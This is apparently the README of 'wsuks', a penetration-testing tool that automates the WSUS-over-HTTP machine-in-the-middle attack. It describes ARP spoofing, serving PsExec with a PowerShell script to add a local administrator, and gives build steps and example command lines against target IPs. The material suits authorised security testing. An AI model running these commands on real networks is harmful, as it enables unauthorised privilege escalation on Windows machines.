### wsuks

_Automating the WSUS Attack_

Gaining local administrative access to a Windows machine that is part of a domain is typically the first step in gaining domain admin privileges during a penetration test. In many cases, the Windows Server Update Service (WSUS) is configured to deploy updates to clients over the local network using HTTP. Without the security of HTTPS, an attacker can mount a machine-in-the-middle attack to serve an update to the client, which will then execute with SYSTEM privileges. Any Microsoft signed executable can be served as an update, including a custom command with which the executable is executed.

To automatically exploit the WSUS attack, this tool spoofs the IP address of the WSUS server on the network using ARP, and when the client requests Windows updates, it serves PsExec64.exe with a predefined PowerShell script to gain local admin privileges. Both the executable file that is served (default: PsExec64.exe) and the command that is executed can be changed if required.\
By default, a Windows client will check for updates approximately every 24 hours.


Prerequisits:
- The target client must be on the local network
- The Windows Server Update Service (WSUS) must be configured using HTTP

Result:
- After successful execution the user provided will be added to the local admin group. If no user was specified a user with the format user[0-9]{5} (e.g. user12345) and a random password will be created

Implemented features:
 - [x] ARP spoofing the target
 - [x] Routing the ARP spoofed packets to the local HTTP server
 - [x] HTTP server to serve the malicious updates
 - [x] Automatic detection of the WSUS server
 - [x] Included PowerShell script and executable to gain local admin access


```bash
podman build -t wsuks .
podman run -it --name wsuks wsuks

wsuks -h


    __          __ _____  _    _  _  __  _____
    \ \        / // ____|| |  | || |/ / / ____|
     \ \  /\  / /| (___  | |  | || ' / | (___
      \ \/  \/ /  \___ \ | |  | ||  <   \___ \
       \  /\  /   ____) || |__| || . \  ____) |
        \/  \/   |_____/  \____/ |_|\_\|_____/

     Pentesting Tool for the WSUS MITM Attack
               Made by NeffIsBack
                 version: 1.0.0

usage: wsuks [-h] [-v] [--debug] [-ts]

options:
  -h, --help        show this help message and exit
  -v, --version     show program's version number and exit
  --debug           Enable debug output
  -ts, --timestamp  Add timestamp to log messages

Examples:
    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2                                   # Generates a new user&password and adds it to the local admin group
    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2 -u User -d Domain.local           # Adds the domain user to the local admin group
    wsuks -t 192.168.0.10 -u User -p Password123 -d Domain.local -dc-ip 192.168.0.1   # Turns on WSUS server discovery and adds the domain user to the local admin group
```